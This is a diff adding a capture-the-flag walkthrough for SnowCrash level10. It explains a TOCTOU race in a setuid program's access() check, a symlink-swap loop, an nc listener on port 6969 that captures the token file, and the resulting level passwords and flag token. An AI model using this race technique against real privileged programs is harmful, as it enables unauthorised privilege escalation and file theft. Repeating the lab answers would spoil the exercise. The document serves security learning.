@@ -3,3 +3,41 @@ Level10 - snow_crash
 Connect with the previous password "s5cAJpM8ev6XHw998pRWG728z"
 	ssh -p 4242 level10@192.168.1.20 
 
+If we use ltrace we see that it connect to a port 6969 but this port is already use
+
+	level10@SnowCrash:~$ ltrace ./level10 .bashrc localhost
+	__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
+	access(".bashrc", 4)                                                               = 0
+	printf("Connecting to %s:6969 .. ", "localhost")                                   = 32
+	fflush(0xb7fd1a20Connecting to localhost:6969 .. )                                                                 = 0
+
+Curl this localhost port 6969 make it that a server is already listening to this address. 
+	level10@SnowCrash:~$ curl localhost -p 6969	
+
+So we know that we can send a file to this address.
+We saw in the ltrace that it use access but access have a vulnerability, a TOCTOU vulnerability. 
+We can than create a script that will launch level10 program  and take advantage of this vulnerability.
+
+The script going to create a file and delete it to replace it with a symlink of same name that point to token. 
+We can trick the level10 program in thinking we going to send our own created file and when the access function is passed,
+we delete le file and make the symlink. 
+
+listen to package on localhost port 6969 
+
+	nc -lk localhost 6969	# l is for listen to a port and k it to keep connecting
+
+In a new terminal 
+
+	mkdir /tmp/test
+	cd /tmp/test
+	vi program.c
+	gcc program.c
+	`while true; do ./a.out; done` 
+	and wait you will see the password on the other terminal
+
+	woupa2yuojeeaaed06riuj63c
+	su flag10
+	Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf
+https://stackoverflow.com/questions/7925177/access-security-hole
